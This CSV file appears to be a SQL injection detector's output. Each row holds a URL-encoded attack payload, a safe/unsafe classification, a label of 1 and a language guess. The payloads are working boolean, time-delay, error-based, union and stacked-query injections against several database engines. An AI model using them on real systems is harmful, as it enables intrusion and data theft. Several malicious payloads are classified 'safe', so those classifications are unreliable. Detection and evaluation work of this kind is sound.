request_id,url,payload,classification,probability,label,detected_language,detected_language_confidence
5afa0741,,1%25%27%20and%202716%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,unsafe,,1,txt,0.49588173627853394
03a7e392,,1%29%29%20and%20char%28109%29%7C%7Cchar%2879%29%7C%7Cchar%2870%29%7C%7Cchar%2890%29%3Dregexp_substring%28repeat%28right%28char%285012%29%2C0%29%2C5000000000%29%2Cnull%29--,unsafe,,1,javascript,0.625948965549469
ad0a47d9,,1%29%29%20as%20xcsm%20where%209231%3D9231%3Bselect%20sleep%285%29%23,unsafe,,1,txt,0.4852890074253082
eef68a11,,1%22%29%20as%20kuuf%20where%206908%3D6908%3Bif%287899%3D7899%29%20select%207899%20else%20drop%20function%20zbbp--,unsafe,,1,txt,0.8945693969726562
9aab8683,,1%27%3Bselect%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%20and%20%27conm%27%20like%20%27conm,unsafe,,1,txt,0.4568087160587311
acceaf37,,1%27%29%20or%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29ydpu%29,unsafe,,1,sql,0.9600746631622314
7b565126,,1%27%29%3Bbegin%20user_lock.sleep%285%29%3B%20end,safe,,1,txt,0.44827860593795776
4a9d6635,,-9208%25%22%29%29%20or%208571%3D8571--,unsafe,,1,txt,0.7955613136291504
a4cc4a7b,,1%27%7C%7C%28select%20%27yzdz%27%20where%205021%3D5021%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,unsafe,,1,javascript,0.7097962498664856
4cc08789,,1%29%20as%20kaew%20where%202658%3D2658%3Bcall%20regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29--,unsafe,,1,txt,0.19637075066566467
ef975dce,,1%3Bselect%20%28case%20when%20%285796%3D8326%29%20then%205796%20else%205796%2A%28select%205796%20from%20information_schema.character_sets%29%20end%29%23,unsafe,,1,txt,0.7430763244628906
8b6dbf70,,1%22%29%29%29%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29%20and%20%28%28%28%22ksxz%22%3D%22ksxz,unsafe,,1,txt,0.3225291073322296
0dc777c6,,1%22%20and%207533%3D7533%20and%20%22dqjp%22%3D%22dqjp,unsafe,,1,txt,0.906920850276947
df432b06,,1%29%29%20as%20queb%20where%202449%3D2449%20union%20all%20select%20null%2Cnull%23,unsafe,,1,txt,0.8781853318214417
3bd08b56,,-5585%27%20or%204144%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284144%3D4144%29%20then%201%20else%200%20end%29%,unsafe,,1,txt,0.35070452094078064
c1602701,,1%27%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4,unsafe,,1,txt,0.49476897716522217
882962f6,,1%22%29%29%29%20and%202716%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29--,unsafe,,1,txt,0.29077333211898804
639fece0,,1%25%22%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29%20and%20%22%25%22%3D%22,unsafe,,1,txt,0.3416418731212616
ab668c46,,1%29%29%20as%20jrzr%20where%205194%3D5194%20and%20char%28107%29%7C%7Cchar%28121%29%7C%7Cchar%2897%29%7C%7Cchar%2880%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29--,unsafe,,1,txt,0.3985839784145355
3e04c4ee,,1%25%22%29%3Bselect%20case%20when%209390%3D5752%20then%201%20else%20null%20end--,safe,,1,txt,0.8700007200241089
af688c2f,,1%29%20where%207485%3D7485%20and%20make_set%288403%3D8403%2C8899%29--,unsafe,,1,txt,0.8275477290153503
32d7a946,,1%29%20as%20sglv%20where%207676%3D7676%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,unsafe,,1,txt,0.478022038936615
c15cf528,,1%20and%203754%3D%28select%20upper%28xmltype%28chr%2860%29%7C%7Cchr%2858%29%7C%7Cchr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%283754%3D3754%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%7C%7Cchr%2862%29%29%29%20from%20dual%29%23%20sipo,unsafe,,1,txt,0.46168428659439087
ef27be21,,1%25%22%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,unsafe,,1,txt,0.20155330002307892
eeec98c5,,1%29%20where%205615%3D5615%20and%20row%286237%2C7469%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%286237%3D6237%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%205192%20union%20select%203785%20union%20select%203931%20union%20select%207158%29a%20group%20by%20x%29--,unsafe,,1,txt,0.6243717670440674
c3fc3705,,1%27%2B%28select%20pxsd%20where%202576%3D2576%20or%20updatexml%281808%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%281808%3D1808%2C1%29%29%29%2C0x717a767a71%29%2C8666%29%29%2B%27,unsafe,,1,txt,0.49182838201522827
df2b05bb,,1%22%29%29%3Bselect%20%28case%20when%20%284666%3D4666%29%20then%201%20else%204666%2A%28select%204666%20from%20master..sysdatabases%29%20end%29--,unsafe,,1,txt,0.4633208215236664
e0e2bf78,,1%29%29%29%3Bselect%20pg_sleep%285%29%20and%20%28%28%289476%3D9476,unsafe,,1,txt,0.27305102348327637
dc64ebb2,,-7125%22%20or%20%288919%3D2275%29%2A2275%20and%20%22fbwo%22%3D%22fbwo,unsafe,,1,txt,0.5126630663871765
45e198c4,,1%27%29%3Bselect%20%2A%20from%20generate_series%287494%2C7494%2Ccase%20when%20%287494%3D7854%29%20then%201%20else%200%20end%29%20limit%201--,unsafe,,1,sql,0.9689432978630066
81c86e52,,1%27%29%29%20and%20exp%28~%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288190%3D8190%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29x%29%29%20and%20%28%28%27kqqf%27%3D%27kqqf,unsafe,,1,txt,0.41405317187309265
93785ca5,,1%22%29%29%20or%20%28select%209173%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289173%3D9173%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%28%22vlev%22%20like%20%22vlev,unsafe,,1,html,0.6312322616577148
04861225,,1%22%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%22sckh%22%3D%22sckh,unsafe,,1,javascript,0.5173474550247192
040bcd10,,-4015%22%20where%202610%3D2610%20or%201%20group%20by%20concat%280x7171706a71%2C%28select%20%28case%20when%20%284232%3D4232%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29%20having%20min%280%29%23,unsafe,,1,javascript,0.5512608289718628
8600d61f,,1%22%29%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%28%22vabm%22%3D%22vabm,unsafe,,1,txt,0.47427406907081604
62a97dd9,,1%25%22%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,,1,javascript,0.5584298968315125
07a32f56,,-9507%25%22%20union%20all%20select%203342%2C3342%2C3342%2C3342%2C3342%23,unsafe,,1,csv,0.8649367690086365
abd5b2af,,1%22%29%20as%20jaxh%20where%206318%3D6318%20and%20extractvalue%287982%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%287982%3D7982%2C1%29%29%29%2C0x717a767a71%29%29--,unsafe,,1,txt,0.3056735694408417
f6bfe21b,,1%27%29%29%29%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29%20and%20%28%28%28%27swua%27%20like%20%27swua,unsafe,,1,javascript,0.6949945688247681
8333f48b,,1%27%20in%20boolean%20mode%29%20or%20elt%286272%3D6272%2Csleep%285%29%29%23,unsafe,,1,txt,0.2823632061481476
298a47ce,,-1287%22%29%20as%20bbzg%20where%201475%3D1475%20union%20all%20select%201475%2C1475%2C1475%2C1475%2C1475%2C1475%2C1475%2C1475%2C1475%23,unsafe,,1,txt,0.32285335659980774
0baec0b0,,1%25%22%29%20or%20elt%286272%3D6272%2Csleep%285%29%29%20and%20%28%22%25%22%3D%22,unsafe,,1,matlab,0.5980205535888672
beea05a2,,1%25%27%29%29%29%20procedure%20analyse%28extractvalue%289627%2Cconcat%280x5c%2C%28benchmark%285000000%2Cmd5%280x4b774c75%29%29%29%29%29%2C1%29%23,safe,,1,r,0.5012989044189453
92370c11,,1%27%29%29%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%27nbsf%27%20like%20%27nbsf,unsafe,,1,javascript,0.5493432283401489
0772e8dd,,-3422%25%27%29%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%27%25%27%3D%27,unsafe,,1,txt,0.35887059569358826
19ed7e4c,,1%25%27%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,,1,javascript,0.5000443458557129
960fa3d3,,1%27%2B%28select%20yjyp%20where%209696%3D9696%3Bselect%20%28case%20when%20%284660%3D4660%29%20then%204660%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,unsafe,,1,txt,0.5724747180938721
57115b37,,1%27%7C%7C%28select%20%27tvcy%27%20where%205592%3D5592%20order%20by%201%23,unsafe,,1,txt,0.3945874571800232
37721bc3,,1%29%20and%202388%3Dbenchmark%285000000%2Cmd5%280x6d457153%29%29%23,unsafe,,1,txt,0.45564690232276917
0c14299b,,1%27%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,,1,javascript,0.8289023637771606
2a7fc63e,,1%27%7C%7C%28select%20%27cfff%27%20where%204994%3D4994%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual%29%7C%7C%27,unsafe,,1,javascript,0.57921302318573
edcd92ae,,1%27%29%29%20and%206240%3D%28%27qqpjq%27%7C%7C%28select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29%20and%20%28%28%27uqfs%27%3D%27uqfs,unsafe,,1,javascript,0.6321640014648438
1a623255,,1%22%29%20where%202602%3D2602%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29--,unsafe,,1,txt,0.5043072700500488
9d5af36a,,1%25%22%29%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29%20and%20%28%22%25%22%3D%22,unsafe,,1,txt,0.4472339451313019
e4200af6,,1%27%29%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29%20and%20%28%27dcys%27%20like%20%27dcys,unsafe,,1,javascript,0.5811825394630432
fb0f66ec,,1%27%29%20where%202725%3D2725%20and%209254%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29--,unsafe,,1,txt,0.3424520194530487
b7d1dc16,,1%27%2B%28select%20%27uzaw%27%20where%209900%3D9900%20or%208315%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29%29%2B%27,unsafe,,1,txt,0.8817447423934937
474f3d7a,,-8588%27%20union%20all%20select%202135%2C2135--,unsafe,,1,txt,0.9822156429290771
44368187,,-5840%27%29%20or%20elt%281032%3D1032%2C3623%29,unsafe,,1,txt,0.3241005539894104
a4e9a93b,,1%27%3Bselect%20%28case%20when%20%287990%3D7627%29%20then%207990%20else%201/%28select%200%29%20end%29--,safe,,1,txt,0.4259893596172333
5166b305,,1%22%29%20or%20char%28119%29%7C%7Cchar%28100%29%7C%7Cchar%2899%29%7C%7Cchar%28121%29%3Dregexp_substring%28repeat%28right%28char%281441%29%2C0%29%2C5000000000%29%2Cnull%29--,unsafe,,1,txt,0.31151798367500305
8c273d10,,-1956%22%29%20where%201448%3D1448%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%2,unsafe,,1,txt,0.3667975664138794
0f6edc86,,1%29%20and%208407%3D%28select%20count%28%2A%29%20from%20generate_series%281%2C5000000%29%29,unsafe,,1,txt,0.6192143559455872
b3e17054,,1%25%22%20and%20elt%285345%3D8751%2C8751%29%20and%20%22%25%22%3D%22,unsafe,,1,txt,0.1909538209438324
70533e45,,1%27%7C%7C%28select%20%27ifts%27%20from%20dual%20where%206329%3D6329%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,unsafe,,1,txt,0.41578710079193115
40503f36,,1%29%29%29%20or%201022%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,,1,txt,0.7735875248908997
32aa2fe9,,1%27%7C%7C%28select%20%27dbxr%27%20where%204014%3D4014%20and%209660%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,,1,sql,0.9033428430557251
855ad892,,-5575%22%20union%20all%20select%208665%2C8665%2C8665%2C8665%2C8665%2C8665%2C8665--,unsafe,,1,txt,0.3850858211517334
f922a33f,,1%27%29%20where%206056%3D6056%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29--,unsafe,,1,txt,0.2694193422794342
8319bfac,,1%29%29%20as%20rpwt%20where%204103%3D4103%20and%203580%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,unsafe,,1,javascript,0.5701925754547119
912015c8,,1%22%29%29%29%20and%20sleep%285%29%23,unsafe,,1,txt,0.16748523712158203
a5f5b609,,1%2C%28select%20%28case%20when%20%285726%3D5275%29%20then%201%20else%201/%28select%200%29%20end%29%29,safe,,1,txt,0.6475783586502075
a9973d70,,1%22%20and%207533%3D7533%20and%20%22btak%22%20like%20%22btak,unsafe,,1,txt,0.9624460935592651
124759ed,,1%27%29%29%20as%20dago%20where%209788%3D9788%3Bselect%20%28case%20when%20%286652%3D1932%29%20then%206652%20else%206652%2A%28select%206652%20from%20information_schema.character_sets%29%20end%29%23,unsafe,,1,txt,0.37090417742729187
83885f79,,1%27%7C%7C%28select%20%27scwx%27%20where%206591%3D6591%20and%203824%3Dbenchmark%285000000%2Cmd5%280x76555642%29%29%29%7C%7C%27,unsafe,,1,txt,0.4728791117668152
0a47bb59,,1%27%29%20and%20%281414%3D4775%29%2A4775%20and%20%28%27mlmw%27%3D%27mlmw,unsafe,,1,javascript,0.5317593812942505
db807c11,,-7548%20or%202850%3D9666,unsafe,,1,txt,0.8584436774253845
154d2ebd,,1%27%29%29%3Bwaitfor%20delay%20%270%3A0%3A5%27%20and%20%28%28%27uvlf%27%3D%27uvlf,unsafe,,1,javascript,0.6055084466934204
7fd7589e,,1%22%29%20union%20all%20select%20null%23,unsafe,,1,txt,0.5747708678245544
11f4fc03,,1%27%29%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%28%28%27vjdk%27%20like%20%27vjdk,unsafe,,1,javascript,0.7272006273269653
19ac2abd,,-5615%27%29%20where%205931%3D5931%20or%208450%3D9229,unsafe,,1,txt,0.5095025897026062
65d644b3,,1%27%20and%204374%3D2305,unsafe,,1,txt,0.8662642240524292
c74a8da7,,1%29%20as%20iqkf%20where%207780%3D7780%3Bselect%20%28case%20when%20%284769%3D4769%29%20then%204769%20else%204769%2A%28select%204769%20from%20mysql.db%29%20end%29%23,unsafe,,1,txt,0.4312599003314972
5b90e4e5,,1%27%29%20where%205871%3D5871%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4--,unsafe,,1,txt,0.34904319047927856
034a6473,,1%27%29%20where%209226%3D9226%20and%209660%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29--,unsafe,,1,txt,0.44882941246032715
12e65df2,,1%29%20as%20ihan%20where%205298%3D5298%20and%20elt%286587%3D3479%2C3479%29--,unsafe,,1,txt,0.9950273633003235
98700a01,,1%27%29%29%20and%207533%3D7533%20and%20%28%28%27gvoh%27%3D%27gvoh,unsafe,,1,javascript,0.5308308005332947
83882a64,,1%27%29%20rlike%20sleep%285%29,safe,,1,txt,0.3778810501098633
85bfa90d,,1%3Bselect%20%28case%20when%20%282768%3D8868%29%20then%202768%20else%20cast%281%20as%20int%29/%28select%200%20from%20dual%29%20end%29%20from%20dual--,unsafe,,1,txt,0.97364342212677
c935f7ac,,-4964%22%29%29%20union%20all%20select%204750%2C4750%2C4750%2C4750%2C4750--,unsafe,,1,txt,0.49678799510002136
8b3d8222,,1%27%29%29%20as%20yqcl%20where%205026%3D5026%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sgvo%29--,unsafe,,1,sql,0.9830954670906067
67c380f1,,1%27%20or%20char%28117%29%7C%7Cchar%28111%29%7C%7Cchar%28105%29%7C%7Cchar%28100%29%3Dregexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%27drui%27%20like%20%27drui,unsafe,,1,javascript,0.6432145237922668
010e2098,,1%22%29%20as%20pwvu%20where%208267%3D8267%3Bselect%20dbms_pipe.receive_message%28chr%2866%29%7C%7Cchr%2867%29%7C%7Cchr%2879%29%7C%7Cchr%28101%29%2C5%29%20from%20dual--,unsafe,,1,txt,0.8501007556915283
86729b3f,,1%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,,1,txt,0.4840141534805298
bae8c37c,,1%27%29%29%3Bselect%20%28case%20when%20%287385%3D8723%29%20then%207385%20else%207385%2A%28select%207385%20from%20information_schema.character_sets%29%20end%29%23,unsafe,,1,txt,0.35901105403900146
49ebbd70,,-2382%25%27%29%20union%20all%20select%208885%2C8885%2C8885%2C8885%2C8885%2C8885%2C8885%23,unsafe,,1,csv,0.9398375153541565
a07788ea,,1%25%22%29%29%3Bcall%20regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%22%25%22%3D%22,unsafe,,1,matlab,0.5605762004852295
4592e042,,-4768%27%7C%7C%28select%20%27dded%27%20from%20dual%20where%206499%3D6499%20union%20all%20select%206499--,unsafe,,1,txt,0.7095719575881958
9c962fe3,,1%27%29%29%20and%209198%3D9198--,unsafe,,1,txt,0.2708633244037628
f8ce003c,,-2857%25%27%29%29%29%20union%20all%20select%207167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%2C7167%23,unsafe,,1,txt,0.3870421051979065
5707bdc6,,%28updatexml%288862%2Cconcat%280x2e%2C0x7171706a71%2C%28select%20%28elt%288862%3D8862%2C1%29%29%29%2C0x717a767a71%29%2C8981%29%29,safe,,1,txt,0.3180992305278778
8e24445d,,1%25%22%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,,1,txt,0.4504941403865814
0926b166,,1%27%29%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29%20and%20%28%27pwpc%27%3D%27pwpc,unsafe,,1,javascript,0.6885716915130615
1497abab,,1%25%22%29%29%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29%20and%20%28%28%22%25%22%3D%22,unsafe,,1,matlab,0.601766049861908
ece62aae,,1%20and%20make_set%289681%3D4703%2C4703%29%23%20zbrf,unsafe,,1,txt,0.30028924345970154
c3b1d8dc,,1%22%20where%209332%3D9332%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,unsafe,,1,javascript,0.6297198534011841
3eedf24d,,1%22%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,unsafe,,1,javascript,0.8449901938438416
d750fa62,,-5013%27%29%29%29%20or%201570%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%281570%3D1570%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113,unsafe,,1,html,0.6700464487075806
daec68fb,,1%27%2B%28select%20bruk%20where%201400%3D1400%20procedure%20analyse%28extractvalue%285840%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28case%20when%20%285840%3D5840%29%20then%201%20else%200%20end%29%29%2C0x717a767a71%29%29%2C1%29%29%2B%27,unsafe,,1,txt,0.40888381004333496
80c1ed0f,,1%22%20where%206352%3D6352%3Bbegin%20dbms_lock.sleep%285%29%3B%20end--,unsafe,,1,txt,0.37139028310775757
08ba47a1,,1%27%20where%206409%3D6409%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,unsafe,,1,txt,0.4460963010787964
648bc01e,,1%27%29%20or%204915%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,unsafe,,1,javascript,0.6895034909248352
9db25170,,1%27%29%29%20and%20%28select%209067%20from%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%289067%3D9067%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20information_schema.character_sets%20group%20by%20x%29a%29%20and%20%28%28%27mymg%27%3D%27mymg,unsafe,,1,txt,0.7821099758148193
9cd8b42b,,1%25%22%3Bselect%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%22%25%22%3D%22,unsafe,,1,csv,0.6829636096954346
7ec0b645,,1%27%29%29%3Bcall%20regexp_substring%28repeat%28right%28char%283702%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%28%27boud%27%3D%27boud,unsafe,,1,matlab,0.6876086592674255
12fe637e,,-3862%27%29%29%20union%20all%20select%202495%2C2495%2C2495%2C2495%2C2495%2C2495%2C2495--,unsafe,,1,txt,0.49884164333343506
c375d939,,1%29%29%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29%20and%20%28%288294%3D8294,unsafe,,1,txt,0.3496093451976776
c5e90092,,1%29%29%29%3Bselect%20%28case%20when%20%284769%3D4769%29%20then%204769%20else%204769%2A%28select%204769%20from%20mysql.db%29%20end%29%23,unsafe,,1,txt,0.4893917441368103
449bdb35,,1%22%29%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%28%22jfgk%22%20like%20%22jfgk,unsafe,,1,txt,0.7910904884338379
